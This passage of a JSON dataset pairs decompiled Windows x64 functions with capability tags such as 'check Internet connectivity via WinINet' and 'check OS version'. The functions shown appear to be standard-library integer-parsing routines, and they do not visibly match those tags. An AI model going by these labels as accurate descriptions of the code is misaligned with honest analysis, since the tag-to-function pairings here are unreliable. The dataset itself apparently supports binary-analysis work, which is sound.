&uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4532
    },
    "140051e7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140051e70(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    int32_t iVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    int16_t *piVar15;\n    uint16_t *puVar16;\n    int64_t iVar17;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    int32_t iVar21;\n    uint8_t uVar22;\n    uint32_t uVar23;\n    bool bVar24;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t iStack160;\n    uint32_t uStack148;\n    uint32_t uStack140;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.1400210c0(in_stack_00000028 + 0xd0);\n    uVar23 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar23 == 0x40) {\n        uVar20 = 8;\ncode_r0x000140051ed8:\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x000140051ef7:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar11) || (uStack140 = 0,  *(iVar13 + 0x96) == uVar11)) {\n                uStack140 = *(iVar13 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar11) && (*(iVar13 + 0x48) != uVar11)) goto code_r0x00014005221a;\n                    goto code_r0x000140051f36;\n                }\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x000140051f36;\ncode_r0x00014005221a:\n                fcn.1400960e0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140024020(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.1400240d0(&piStack104);\n                    cVar8 = *(iVar13 + 0x20);\n                    goto code_r0x000140051f36;\n                }\n                iVar21 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x000140051f36:\n                iVar21 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar13 + 0x4a) != uVar11)) &&\n                       (*(iVar13 + 0x48) != uVar11))) {\n                    if (*(iVar13 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar20 == 10;\n                        if (!bVar3) goto code_r0x000140051f69;\n                        bVar24 = uVar20 == 8;\n                        if (bVar24 || uVar23 == 0) {\n                            iVar21 = 0;\n                            uVar20 = 8;\n                            bVar3 = bVar24 || uVar23 == 0;\n                        }\n                        else {\n                            iVar21 = iVar21 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140051f69:\n                        if ((*(iVar13 + 0x98) != uVar11) && (*(iVar13 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140052012;\n                        }\n                        uVar7 = uVar20 == 0x10 || uVar23 == 0;\n                        if (uVar20 != 0x10 && uVar23 != 0) {\n                            bVar3 = true;\n                            goto code_r0x00014005201c;\n                        }\n                        iVar21 = 0;\n                        uVar20 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x000140051fd2;\ncode_r0x000140052490:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x000140052490;\ncode_r0x000140051fd2:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar14;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar24 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar24)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar24 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar24) {\n                        uVar7 = 1;\n                        goto code_r0x000140052012;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar13 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x000140052012:\n            if (uVar20 == 0x10) goto code_r0x000140052289;\n        }\n        else {\n            uStack140 = 0;\n            uVar11 = 0;\n            iVar21 = 0;\n            bVar3 = false;\n        }\ncode_r0x00014005201c:\n        iStack160 = uVar20;\n        uStack148 = uVar20;\n    }\n    else {\n        uVar20 = 10;\n        if (uVar23 != 8) goto code_r0x000140051ed8;\n        uVar20 = 0x10;\n        uVar7 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar7 == 0) goto code_r0x000140051ef7;\n        uStack140 = 0;\n        uVar11 = 0;\n        iVar21 = 0;\n        bVar3 = false;\ncode_r0x000140052289:\n        uStack148 = 0x10;\n        uVar20 = 0x16;\n        iStack160 = 0x16;\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar23 = uStack140 + 0x7fffffff;\n    uVar2 = *(iVar13 + 200);\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar22 = 0;\n        if (uVar7 == 0) {\n            uVar19 = 0;\ncode_r0x000140052095:\n            uVar18 = uVar11;\n            if (uVar20 < 0xb) {\n                if ((uVar11 < 0x30) || (iStack160 + 0x30U <= uVar11)) goto code_r0x000140052368;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x000140052514;\n                iVar12 = uVar18 - 0x57;\n                goto code_r0x0001400520ba;\n            }\n            iVar12 = uVar18 - 0x30;\ncode_r0x0001400520ba:\n            do {\n                piVar4 = piStack104;\n                if (uVar23 / uStack148 < uVar19) {\n                    uVar22 = 1;\n                }\n                else {\n                    uVar18 = uVar19 * uStack148;\n                    uVar19 = uVar18 + iVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar22 = uVar22 | uVar23 - iVar12 < uVar18;\n                }\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar15 = piStack104[2] + 1;\n                    piStack104[2] = piVar15;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar15 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar15 < piVar14) {\n                    iVar10 = *piVar15;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar24 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar24)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar24 = iVar9 == -1;\n                }\n                if (bVar24 == (iVar10 == -1)) {\n                    uVar2 = 1;\n                    goto code_r0x000140052154;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x000140052095;\n                    piStack104 = NULL;\n                }\n                if (uVar20 < 0xb) goto code_r0x000140052368;\n                uVar18 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x000140052514:\n                if (5 < uVar11 - 0x41) goto code_r0x000140052368;\n                iVar12 = uVar18 - 0x37;\n            } while( true );\n        }\n        uVar19 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar22 = 0;\n            uVar19 = 0;\ncode_r0x000140052550:\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar11)) {\n                puVar16 = iVar13 + 0x9c;\n                iVar17 = iStack160;\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x000140052368;\n                while (*puVar16 != uVar11) {\n                    iVar17 = iVar17 + -1;\n                    puVar16 = puVar16 + 1;\n                    if (iVar17 == 0) goto code_r0x000140052368;\n                }\n                iVar12 = puVar16 - (iVar13 + 0x9c) >> 1;\n                if (0xf < iVar12) {\n                    iVar12 = iVar12 + -6;\n                }\n                uVar6 = uVar2;\n                if (uVar19 <= uVar23 / uStack148) {\n                    uVar20 = uVar19 * uStack148;\n                    uVar19 = uVar20 + iVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar6 = uVar22 | uVar23 - iVar12 < uVar20;\n                }\n            }\n            else {\n                if (iVar21 == 0) {\n                    uVar5 = *(iVar13 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x000140052154;\n                }\n                fcn.140077ac0(aiStack80, iVar21);\n                iVar21 = 0;\n                uVar6 = uVar22;\n            }\n            uVar22 = uVar6;\n            piVar4 = piStack104;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar15 = piStack104[2] + 1;\n                piStack104[2] = piVar15;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar15 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar15 < piVar14) {\n                iVar10 = *piVar15;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar24 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar24)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar24 = iVar9 == -1;\n            }\n            if (bVar24 == (iVar10 == -1)) goto code_r0x000140052154;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x000140052550;\n        }\n        uVar19 = 0;\n        uVar22 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x000140052154:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014005237d;\ncode_r0x000140052168:\n    if ((iVar21 != 0) || (bVar3)) {\ncode_r0x0001400523c1:\n        if (uVar7 == 0) {\n            if (uVar22 == 0) {\n                uVar23 = -uVar19;\n                if (uStack140 == '\\0') {\n                    uVar23 = uVar19;\n                }\n                *in_stack_00000038 = uVar23;\n            }\n            else {\n                *in_stack_00000038 = uStack140 + 0x7fffffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x000140052197;\n        }\n    }\n    goto code_r0x00014005217b;\ncode_r0x000140052368:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140052168;\ncode_r0x00014005237d:\n    fcn.140077ac0(aiStack80, iVar21);\n    cVar8 = fcn.1400b15c0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar21 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x0001400523c1;\ncode_r0x00014005217b:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140052197:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar21 = **0x140102a70;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar21 == 0) {\n        iVar21 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar21 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar21 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar21 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4525
    },
    "14005292": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140052920(int64_t **arg1)\n\n{\n    uint64_t arg2;\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    char cVar7;\n    int16_t iVar8;\n    int16_t iVar9;\n    uint16_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    int16_t *piVar15;\n    uint16_t *puVar16;\n    int64_t iVar17;\n    int32_t iVar18;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    bool bVar22;\n    bool bVar23;\n    ulong var_10h;\n    ulong var_18h;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    int64_t iStack144;\n    uint32_t uStack136;\n    uint8_t uStack131;\n    uint8_t uStack130;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.1400210c0(in_stack_00000028 + 0xd0);\n    uVar20 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar20 == 0x40) {\n        uVar19 = 8;\ncode_r0x000140052988:\n        uVar6 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar6 == 0) {\ncode_r0x0001400529a7:\n            uVar10 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar10 = *piStack104[2];\n                }\n                else {\n                    uVar10 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar10 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar7 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar10) || (bVar23 = false,  *(iVar13 + 0x96) == uVar10)) {\n                bVar23 = *(iVar13 + 0x94) == uVar10;\n                if (cVar7 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar10) && (*(iVar13 + 0x48) != uVar10)) goto code_r0x000140052cba;\n                    goto code_r0x0001400529e6;\n                }\n                if (*(iVar13 + 0x48) == uVar10) goto code_r0x0001400529e6;\ncode_r0x000140052cba:\n                fcn.1400960e0(piStack104);\n                uStack96 = 0xffff;\n                uVar6 = fcn.140024020(&piStack104, &piStack120);\n                if (uVar6 == 0) {\n                    uVar10 = fcn.1400240d0(&piStack104);\n                    cVar7 = *(iVar13 + 0x20);\n                    goto code_r0x0001400529e6;\n                }\n                iVar18 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x0001400529e6:\n                iVar18 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar7 == '\\0' || (*(iVar13 + 0x4a) != uVar10)) &&\n                       (uVar10 != *(iVar13 + 0x48)))) {\n                    if (uVar10 == *(iVar13 + 0x9c)) {\n                        bVar3 = bVar3 ^ 1U | uVar19 == 10;\n                        if (!bVar3) goto code_r0x000140052a19;\n                        bVar22 = uVar19 == 8;\n                        if (bVar22 || uVar20 == 0) {\n                            iVar18 = 0;\n                            uVar19 = 8;\n                            bVar3 = bVar22 || uVar20 == 0;\n                        }\n                        else {\n                            iVar18 = iVar18 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140052a19:\n                        if ((uVar10 != *(iVar13 + 0x98)) && (uVar10 != *(iVar13 + 0x9a))) {\n                            uVar6 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140052ac2;\n                        }\n                        uVar6 = uVar19 == 0x10 || uVar20 == 0;\n                        if (uVar19 != 0x10 && uVar20 != 0) {\n                            bVar3 = true;\n                            goto code_r0x000140052acc;\n                        }\n                        iVar18 = 0;\n                        uVar19 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x000140052a82;\ncode_r0x000140052f30:\n                        uStack96 = 0xffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x000140052f30;\ncode_r0x000140052a82:\n                        uStack96 = 0xffff;\n                        iVar8 = *piVar14;\n                    }\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar22 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar22)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar22 = iVar9 == -1;\n                    }\n                    if (bVar22 == (iVar8 == -1)) {\n                        uVar6 = 1;\n                        goto code_r0x000140052ac2;\n                    }\n                    uVar10 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar10 = *piStack104[2];\n                        }\n                        else {\n                            uVar10 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar10 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar7 = *(iVar13 + 0x20);\n                }\n                uVar6 = 0;\n            }\ncode_r0x000140052ac2:\n            if (uVar19 == 0x10) goto code_r0x000140052d29;\n        }\n        else {\n            bVar23 = false;\n            uVar10 = 0;\n            iVar18 = 0;\n            bVar3 = false;\n        }\ncode_r0x000140052acc:\n        iStack144 = uVar19;\n        uStack136 = uVar19;\n    }\n    else {\n        uVar19 = 10;\n        if (uVar20 != 8) goto code_r0x000140052988;\n        uVar19 = 0x10;\n        uVar6 = fcn.140024020(&piStack104, &piStack120);\n        if (uVar6 == 0) goto code_r0x0001400529a7;\n        bVar23 = false;\n        uVar10 = 0;\n        iVar18 = 0;\n        bVar3 = false;\ncode_r0x000140052d29:\n        uStack136 = 0x10;\n        uVar19 = 0x16;\n        iStack144 = 0x16;\n    }\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar20 = 0xffffffff / uStack136;\n    uStack130 = *(iVar13 + 200);\n    if (uStack130 == 0) {\n        uStack131 = 0;\n        if (uVar6 == 0) {\n            uVar12 = 0;\ncode_r0x000140052b3b:\n            uVar11 = uVar10;\n            if (uVar19 < 0xb) {\n                if ((uVar10 < 0x30) || (iStack144 + 0x30U <= uVar10)) goto code_r0x000140052e08;\n            }\n            else if (9 < uVar10 - 0x30) {\n                if (5 < uVar10 - 0x61) goto code_r0x000140052fb4;\n                uVar11 = uVar11 - 0x57;\n                goto code_r0x000140052b5f;\n            }\n            uVar11 = uVar11 - 0x30;\ncode_r0x000140052b5f:\n            do {\n                piVar4 = piStack104;\n                if (uVar20 < uVar12) {\n                    uStack131 = 1;\n                }\n                else {\n                    uVar21 = uVar12 * uStack136;\n                    uVar12 = uVar11 + uVar21;\n                    uStack131 = uStack131 | CARRY4(uVar11, uVar21);\n                    iVar18 = iVar18 + 1;\n                }\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar15 = piStack104[2] + 1;\n                    piStack104[2] = piVar15;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar15 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar15 < piVar14) {\n                    iVar8 = *piVar15;\n                }\n                else {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar8 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar22 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar22)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar22 = iVar9 == -1;\n                }\n                if (bVar22 == (iVar8 == -1)) {\n                    uStack130 = 1;\n                    uVar5 = uVar6;\n                    goto code_r0x000140052bf8;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = *piStack104[2];\n                    }\n                    else {\n                        uVar10 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar10 != 0xffff) goto code_r0x000140052b3b;\n                    piStack104 = NULL;\n                }\n                if (uVar19 < 0xb) goto code_r0x000140052e08;\n                uVar11 = 0xffff;\n                uVar10 = 0xffff;\ncode_r0x000140052fb4:\n                if (5 < uVar10 - 0x41) goto code_r0x000140052e08;\n                uVar11 = uVar11 - 0x37;\n            } while( true );\n        }\n        uVar12 = 0;\n        uVar5 = 0;\n        uStack130 = uVar6;\n    }\n    else {\n        if (uVar6 == 0) {\n            uStack131 = 0;\n            uVar12 = 0;\ncode_r0x000140052ff2:\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar10)) {\n                puVar16 = iVar13 + 0x9c;\n                iVar17 = iStack144;\n                if (*(iVar13 + 0x48) == uVar10) goto code_r0x000140052e08;\n                while (uVar10 != *puVar16) {\n                    iVar17 = iVar17 + -1;\n                    puVar16 = puVar16 + 1;\n                    if (iVar17 == 0) goto code_r0x000140052e08;\n                }\n                uVar19 = puVar16 - (iVar13 + 0x9c) >> 1;\n                if (0xf < uVar19) {\n                    uVar19 = uVar19 - 6;\n                }\n                uVar5 = uStack130;\n                if (uVar12 <= uVar20) {\n                    uVar11 = uVar12 * uStack136;\n                    uVar12 = uVar19 + uVar11;\n                    iVar18 = iVar18 + 1;\n                    uVar5 = uStack131 | CARRY4(uVar19, uVar11);\n                }\n            }\n            else {\n                iVar17 = *(aiStack80[0] + -0x18);\n                if (iVar18 == 0) {\n                    uStack130 = 0;\n                    uVar5 = *(iVar13 + 0x20);\n                    goto code_r0x000140052bf8;\n                }\n                arg2 = iVar17 + 1;\n                if (*(aiStack80[0] + -0x10) < arg2) {\ncode_r0x00014005315c:\n                    fcn.140077810(aiStack80, arg2);\n                }\n                else {\n                    if (**0x140102a70 == 0) {\n                        iVar2 = *(aiStack80[0] + -8);\n                    }\n                    else {\n                        iVar2 = *(aiStack80[0] + -8);\n                    }\n                    if (0 < iVar2) goto code_r0x00014005315c;\n                }\n                *(aiStack80[0] + *(aiStack80[0] + -0x18)) = iVar18;\n                iVar18 = 0;\n                *(aiStack80[0] + -8) = 0;\n                *(aiStack80[0] + -0x18) = arg2;\n                *(aiStack80[0] + 1 + iVar17) = 0;\n                uVar5 = uStack131;\n            }\n            uStack131 = uVar5;\n            piVar4 = piStack104;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar15 = piStack104[2] + 1;\n                piStack104[2] = piVar15;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar15 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar15 < piVar14) {\n                iVar8 = *piVar15;\n            }\n            else {\n                iVar8 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar8 == -1) {\n                piStack104 = NULL;\n            }\n            bVar22 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar22)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar22 = iVar9 == -1;\n            }\n            if ((iVar8 == -1) != bVar22) {\n                if (piStack104 == NULL) {\n                    uVar10 = 0xffff;\n                }\n                else {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = *piStack104[2];\n                    }\n                    else {\n                        uVar10 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar10 == 0xffff) {\n                        piStack104 = NULL;\n                    }\n                }\n                goto code_r0x000140052ff2;\n            }\n            goto code_r0x000140052e0d;\n        }\n        uVar12 = 0;\n        uStack131 = 0;\n        uVar5 = 0;\n        uStack130 = uVar6;\n    }\ncode_r0x000140052bf8:\n    uVar6 = uVar5;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140052c08;\ncode_r0x000140052e1d:\n    fcn.140077ac0(aiStack80, iVar18);\n    cVar7 = fcn.1400b15c0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar7 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar18 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140052e5f;\n    goto code_r0x000140052c1a;\ncode_r0x000140052e08:\n    uStack130 = 0;\ncode_r0x000140052e0d:\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x000140052e1d;\ncode_r0x000140052c08:\n    if ((iVar18 != 0) || (bVar3)) {\ncode_r0x000140052e5f:\n        if (uVar6 == 0) {\n            if (uStack131 == 0) {\n                if (bVar23) {\n                    uVar12 = -uVar12;\n                }\n                *in_stack_00000038 = uVar12;\n            }\n            else {\n                *in_stack_00000038 = 0xffffffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x000140052c36;\n        }\n    }\ncode_r0x000140052c1a:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140052c36:\n    if (uStack130 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar18 = **0x140102a70;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar18 == 0) {\n        iVar18 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar18 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar18 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar18 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4784
    },
    "14005343": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
